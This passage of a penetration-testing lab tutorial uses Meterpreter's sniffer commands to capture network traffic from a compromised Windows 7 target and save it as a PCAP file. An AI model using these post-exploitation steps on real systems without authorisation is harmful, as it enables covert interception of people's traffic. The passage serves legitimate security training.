- img_proc: true
  md: '3. Now enter, "help". You should have a new addition to the Meterpreter commands:


    | Command | Description |

    |--- | --- |

    | sniffer_dump | Retrieve captured packet data to PCAP file |

    | sniffer_interfaces | Enumerate all sniffable network interfaces |

    | sniffer_release | Free captured packets on a specific interface |

    | sniffer_start | Start capture on a specific interface |

    | sniffer_stats | View statistics of an active capture |

    | sniffer_stop | Stop packet capture on a specific interface |


    4. Enter, "sniffer_interfaces" to see a list of available network interfaces on
    the target:


    I have two interfaces on my Windows 7 target (yours may be different), a WAN Miniport
    and Intel NIC. I will use interface #2, the Intel NIC, for sniffing.


    5. To start capturing packets, enter "sniffer_start 2".


    6. Now, go to the Windows 7 target system and do some surfing. Every location
    you surf to and every network packet you send will be recorded on the Kali system.


    7. To save what you have captured, enter "sniffer_dump 2" /tmp/win7capture.cap".


    And that is it; all the data will be saved in the "/tmp/win7capture.cap" file.


    8. When done, enter "sniffer_stop 2" to stop the sniffer and "sniffer_release
    2" to discard any extra packets.


